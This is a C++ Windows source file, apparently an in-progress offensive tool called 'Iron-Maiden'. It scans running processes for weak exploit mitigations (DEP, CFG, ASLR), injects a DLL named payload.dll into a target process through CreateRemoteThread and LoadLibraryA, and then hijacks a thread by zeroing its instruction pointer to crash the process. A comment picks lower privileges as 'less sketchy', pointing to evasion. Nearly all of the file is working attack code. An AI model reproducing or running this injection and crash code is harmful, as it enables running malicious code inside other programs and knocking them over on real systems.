#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>


bool ProtCheck(DWORD ProcId)
{
	HANDLE hwld = OpenProcess(PROCESS_QUERY_INFORMATION, false, ProcId); // try replacing PROCESS_ALL_ACCESS with PROCESS_QUERY_INFORMATION because less privs is less sketchy
	if(!hwld)
	{
		return false;
	}
	
	PROCESS_MITIGATION_ASLR_POLICY aslr;
	PROCESS_MITIGATION_DEP_POLICY dep;
	PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfg;
	
	// ProcessDEPPolicy, ProcessASLRPolicy, and ProcessControlFlowGuardPolicy checks are needed
	if(!GetProcessMitigationPolicy(hwld, ProcessDEPPolicy, &dep, sizeof(dep)))
	{
		CloseHandle(hwld);
		return false;
	}
	std::cout << "[+] Data Execution Preventation: " << dep.Enable << "\n";
	if(!GetProcessMitigationPolicy(hwld, ProcessControlFlowGuardPolicy, &cfg, sizeof(cfg)))
	{
		CloseHandle(hwld);
		return false;
	}
	std::cout << "[+] Control Flow Guard/Control Flow Integrity: " << cfg.EnableControlFlowGuard << "\n";
	if(!GetProcessMitigationPolicy(hwld, ProcessASLRPolicy, &aslr, sizeof(aslr)))
	{
		CloseHandle(hwld);
		return false;
	}
	std::cout << "[+] Address Space Layout Randomization: " << aslr.EnableBottomUpRandomization << "\n";
	std::cout << "[+] Address Space Layout Randomization: " << aslr.EnableForceRelocateImages << "\n";
	CloseHandle(hwld);
	return true;
}

int ProcIDs()
{
	PROCESSENTRY32 pe;
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if(snap == INVALID_HANDLE_VALUE)
	{
		return 1;
	}
	bool check = Process32First(snap, &pe);
	if(!check)
	{
		CloseHandle(snap);
		return 1;
	}
	while(check)
	{
		if(ProtCheck(pe.th32ProcessID)) // check if the value is that certain value for minimal protections
		{
			std::cout << pe.th32ProcessID << " : " << pe.szExeFile << "\n";
			// add each PID and maybe the exec name to a global list
		}
		check = Process32Next(snap, &pe);
	}
	CloseHandle(snap);
	return 0;
}

int TestEnumeration(const char* target)
{
	PROCESSENTRY32 pe;
	HANDLE snap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if(snap == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	bool check = Process32First(snap, &pe);
	if(!check)
	{
		CloseHandle(snap);
		return -1;
	}
	while(check)
	{
		if(strcmp(target, pe.szExeFile) == 0)
		{
			CloseHandle(snap);
			return pe.th32ProcessID;
		}
		check = Process32Next(snap, &pe);
	}
	CloseHandle(snap);
	return -1;
}



int GetThreadID(int PID)
{
	THREADENTRY32 threadEntry;
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);

	while(Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == PID)
		{
			std::cout << "thread ID: " << threadEntry.th32ThreadID << "\n";
			CloseHandle(snapshot);
			return threadEntry.th32ThreadID;
		}
	}
	CloseHandle(snapshot);
	return -1;
}


bool ExceptionInjector(int pid) // DLL injection stuff might change this to a better injection technique
{
	const char* dllpath = "C:\\Users\\Owner\\Desktop\\Projects\\Iron-Maiden\\payload.dll";
	size_t pathsize = strlen(dllpath) + 1;
	
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if(proc == NULL)
	{
		std::cout << "[-] Could not obtain handle for " << pid << "!\n";
		return 0;
	}
	LPVOID allocation = VirtualAllocEx(proc, NULL, pathsize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE); // PAGE_EXECUTE_READWRITE
	if(allocation == NULL)
	{
		std::cout << "[-] Failed to allocate memory!\n";
		CloseHandle(proc);
		return 0;
	}
	if(!WriteProcessMemory(proc, allocation, dllpath, pathsize, NULL))
	{
		std::cout << "[-] Failed to write dll to memory!\n";
		VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
		CloseHandle(proc);
		return 0;
	}
	HANDLE tread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"), allocation, 0, NULL);
	if(tread == NULL)
	{
		std::cout << "[-] Failed to execute DLL in remote process!\n";
		VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
		CloseHandle(proc);
		return 0;
	}
	WaitForSingleObject(tread, INFINITE);
	
	VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
	CloseHandle(tread);
	CloseHandle(proc);
	
	std::cout << "[+] Successfully injected & executed DLL with some cleaning up!";
	return 1;
}

int main()
{
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	
	//if(ProcIDs())
	//{
	//	std::cout << "[-] Failed to enumerate PIDs!!";
	//	exit(-1);
	//}
	
	
	const char* exe = "notepad.exe";					// Start of the test code segment
	int pid = TestEnumeration(exe);						// The PID retreived from here should be from ProcIDs
	if(pid == -1)										// Error handling is the same
	{													// ---->Test Code segments are segments only used for
		std::cout << "[-] notepad.exe is not running";	//		debugging purposes so in the final build please
		exit(-1);										//		remove this segment and refactor the code in case
	}													// End of the test code segment
	
	if(!ExceptionInjector(pid))
	{
		std::cout << "[-] Failed to inject DLL!";
		exit(-1);
	}
	
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if(!hProcess)
	{
		std::cout << "[-] Failed to get handle!!";
		exit(-1);
	}

	int tid = GetThreadID(pid);
	if(tid == -1)
	{
		std::cout << "[-] Failed to get Thread ID";
		CloseHandle(hProcess);
		exit(-1);
	}
	
	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, false, tid);
	if(!hThread)
	{
		std::cout << "[-] Failed to open thread";
		CloseHandle(hProcess);
		exit(-1);
	}
	
	SuspendThread(hThread);
	GetThreadContext(hThread, &ctx);
	ctx.Rip = (DWORD64)nullptr; // try using 0x999999999999999999999999999999999999999999999999999999 it also works
	SetThreadContext(hThread, &ctx);
	 
	// Once thread is resumed the remote 
	// process will hang then terminate 
	// due to a segfault crash by setting
	// instruction pointer to invalid address
	
	ResumeThread(hThread);
	std::cout << "[!] Check if remote process crashed";
	CloseHandle(hProcess);
	CloseHandle(hThread);
}
